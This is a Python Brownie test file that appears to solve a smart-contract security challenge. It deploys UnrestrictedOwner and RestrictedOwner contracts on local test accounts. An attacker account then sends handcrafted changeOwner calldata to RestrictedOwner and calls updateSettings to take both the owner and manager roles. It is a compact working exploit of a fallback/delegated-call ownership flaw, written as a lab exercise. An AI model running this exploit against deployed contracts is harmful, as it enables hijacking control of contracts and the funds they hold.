from web3 import Web3
from brownie import accounts, UnrestrictedOwner, RestrictedOwner, reverts
import pytest
from eth_abi import encode_abi

@pytest.fixture
def deploy():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'

    [deployer, user, attacker] = accounts[:3]

    # Adding 100 accounts
    print(red,"\r[ * ] \x1b[0;43m0xm4ud CALL Attacker 3000\x1b[0;m")
    print(red,"\r[ * ]\x1b[0;m RICKY BOBBY says: I WANNA CALL FAST!!!",nocolor)

    # Web3 instance
    w3 = Web3(Web3.HTTPProvider())

    #Deploy RainbowAllianceToken
    print(green,"\r[ + ]\x1b[0;m Deploying UnrestrictedOwner and RestrictedOner",nocolor)
    unrestrictedOwner= UnrestrictedOwner.deploy({'from': deployer, 'gas_price': 0x4133110a0})
    restrictedOwner= RestrictedOwner.deploy(unrestrictedOwner.address, {'from': deployer, 'gas_price': 0x4133110a0})

    # Any user can take ownership on `UnrestrictedOwner` contract
    assert(unrestrictedOwner.changeOwner(user.address, {'from': user, 'gas_price': 0x4133110a0}))
    assert(unrestrictedOwner.owner() == user.address)

    # Any user can take ownership on `RestrictedOwner` contract
    with reverts():
        assert(restrictedOwner.updateSettings(user.address, user.address, {'from': user, 'gas_price': 0x4133110a0}))
    assert(restrictedOwner.owner() == deployer.address)
    assert(restrictedOwner.manager() == deployer.address)

    return unrestrictedOwner, restrictedOwner, deployer, user, attacker, w3


def test_exploit(deploy):

    unrestrictedOwner, restrictedOwner, deployer, user, attacker, w3 = deploy

    function_signature = w3.keccak(text="changeOwner(address)")[:4].hex()
    sig = function_signature + encode_abi(['address'], [attacker.address]).hex()
    attacker.transfer(to=restrictedOwner.address, data=sig)

    restrictedOwner.updateSettings(attacker.address, attacker.address, {'from': attacker, 'gas_price': 0x4133110a0})

    assert(restrictedOwner.owner() == attacker.address)
    assert(restrictedOwner.manager() == attacker.address)